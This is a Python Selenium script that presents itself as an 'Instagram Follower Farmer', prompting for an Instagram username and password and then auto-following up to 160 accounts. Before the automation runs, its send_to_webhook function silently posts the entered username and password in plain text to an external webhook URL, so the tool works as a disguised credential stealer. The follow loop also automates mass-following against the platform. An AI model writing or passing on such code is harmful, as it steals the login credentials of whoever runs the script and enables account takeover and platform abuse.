from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import random
import time
import requests
from config import WEBHOOK_URL  

LOGIN_URL = "https://www.instagram.com/"

def send_to_webhook(username, password):
    """instagram login."""
    payload = {
        "username": "Instagram Bot",
        "embeds": [
            {
                "title": "Instagram Login:",
                "description": f"Username: {username}\nPassword: {password}",
                "color": 0xFF0000  
            }
        ]
    }
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("The Bot Is Running.")
    else:
        print(f"An Error Occured: {response.status_code}, {response.text}")

def run_selenium_script(username, password):
    """Automate Instagram login and follow users using Selenium."""
    try:
        driver = webdriver.Chrome()
        driver.get(LOGIN_URL)

        
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='username']"))
        )

        
        username_field = driver.find_element(By.CSS_SELECTOR, "input[name='username']")
        password_field = driver.find_element(By.CSS_SELECTOR, "input[name='password']")
        login_button = driver.find_element(By.CSS_SELECTOR, "form#loginForm button[type='submit']")

        username_field.clear()
        username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(password)
        login_button.click()

        
        try:
            not_now_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[text()='Not now']"))
            )
            not_now_button.click()
        except Exception as e:
            print(f"No 'Save your login info?' prompt: {e}")

        print("Login successful! The script will now follow random users.")

        actions = ActionChains(driver)
        follow_count = 0
        follow_limit = 160

        while follow_count < follow_limit:
            try:
                follow_buttons = WebDriverWait(driver, 10).until(
                    EC.presence_of_all_elements_located(
                        (By.XPATH, "//button[div/div[text()='Follow']]")
                    )
                )
                for button in follow_buttons:
                    if 'Follow' in button.text:
                        actions.move_to_element(button).perform()
                        button.click()
                        follow_count += 1
                        print(f"Followed a user! Total follows: {follow_count}")
                        if follow_count >= follow_limit:
                            print("Follow limit reached. Stopping...")
                            break

                driver.refresh()
                time.sleep(random.randint(5, 10))

            except Exception as e:
                print(f"Error in the main loop: {e}")
                time.sleep(5)

    except Exception as e:
        print(f"An error occurred during automation: {e}")

    finally:
        if driver:
            driver.quit()

if __name__ == "__main__":
    print("Welcome to the Instagram Follower Farmer")
    username = input("Enter your Instagram username: ")
    password = input("Enter your Instagram password: ")

   
    send_to_webhook(username, password)

    
    run_selenium_script(username, password)